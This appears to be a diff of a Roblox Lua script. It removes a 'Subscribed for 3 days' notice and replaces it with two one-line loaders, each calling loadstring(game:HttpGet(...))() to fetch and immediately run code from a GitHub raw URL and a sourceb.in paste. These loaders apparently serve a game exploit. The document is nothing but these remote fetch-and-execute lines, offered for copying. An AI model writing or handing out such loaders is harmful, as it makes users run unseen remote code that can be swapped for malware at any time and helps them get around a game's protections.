@@ -1,5 +1,3 @@
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Notice",
-    Text = "Subscribed for 3 days to work",
-    Duration = 5
-})
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/Loadload.lua'))()
+-- For Mobile Copy:
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/w7v34DcOpq/0", true))()
